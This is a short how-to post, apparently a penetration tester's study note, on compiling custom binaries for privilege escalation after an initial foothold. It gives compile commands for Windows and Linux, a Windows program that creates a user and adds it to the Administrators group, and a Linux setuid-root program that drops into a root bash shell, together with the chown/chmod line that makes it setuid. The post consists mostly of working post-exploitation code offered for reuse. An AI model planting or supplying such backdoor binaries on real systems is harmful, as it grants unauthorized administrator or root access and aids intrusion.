---
title: Compiling Custom Binaries
date_created: 2021-07-31
date_updated: 
metadata: howto
---
# Compiling Custom Binaries

I created this post to address situations wherein a direct `msfvenom` reverse shell may be cumbersome to use. These binaries will provide other ways to obtain an escalated shell after an initial foothold.

Additionally, these privilege escalation paths should make it easier to reexploit compared to juggling listeners and reverse shells.

## Dependencies and Compiling

These binaries will be compiled on a Kali system -  this should work on other Debian-based distributions like Ubuntu provided the packages are available.

```bash
sudo apt install gcc mingw-w64
```

Generally compiling with follow the following patterns but may vary depending on the imported libraries.

1. Windows

	```bash
	i686-w64-mingw32-gcc code.c -l ws2_32 -o code.exe
	```
	
	Base code:
	
	```bash
	#include <stdio.h>
	#include <stdlib.h>

	int main(void){
		 system("whoami");
		 return 0;
		 }
	```

2. Linux

	```bash
	gcc code.c -o code
	```
	
	Base code:
	
	```bash
	#include <stdio.h>
	#include <stdlib.h>

	int main(void){
		system("whoami");
	}
	```

## Useful Examples

### Windows - Add New User to Administrators group

Have this binary be executed with escalated priviliges.

```bash
#include <stdio.h>
#include <stdlib.h>

int main(void){
     system("net user username password /add");
     system("net localgroup Administrators username /add");
     return 0;
     }
```

### Linux - Elevate Bash Shell

The binary needs to have the SetUID bit and be owned by root to have it be executed with escalated privileges. This can be done using the following snippet:

```bash
chown root.root /tmp/rootme; chmod +sx /tmp/rootme
```

```bash
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

int main(void){
	setuid(0); setgid(0); system("/bin/bash");
}
```